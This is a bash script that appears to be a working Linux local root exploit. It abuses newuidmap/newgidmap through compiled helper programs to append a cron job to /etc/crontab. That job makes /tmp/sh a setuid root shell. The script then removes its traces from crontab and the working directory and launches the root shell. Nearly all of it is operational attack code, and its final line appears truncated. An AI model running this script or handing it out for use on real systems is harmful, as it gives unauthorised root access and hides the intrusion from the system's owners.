rootshell="/tmp/sh"
bootstrap="/tmp/payload"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo 'Compiling subuid_shell.c failed'
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo 'Compiling gcc_subshell.c failed'
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo 'Compiling rootshell.c failed'
  exit 1
fi

echo "[*] Writing payload to ${bootstrap}..."

echo "#!/bin/sh\n/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}" > $bootstrap
/bin/chmod +x "${bootstrap}"

echo "[*] Adding cron job... (wait a minute)"

echo "echo '* * * * * root ${bootstrap}' >> /etc/crontab" | ./subuid_shell ./subshell
sleep 60

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  /bin/rm "${bootstrap}"
  exit 1
fi

echo '[+] Success:'
ls -la "${rootshell}"

echo '[*] Cleaning up...'
/bin/rm "${bootstrap}"
/bin/rm subuid_shell
/bin/rm subshell
if command_exists /bin/sed; then
  echo "/bin/sed -i '\$ d' /etc/crontab" | $rootshell
else
  echo "[!] Manual clean up of /etc/crontab required"
fi

echo "[*] Launching root shell: ${rootshell}"
$rootshel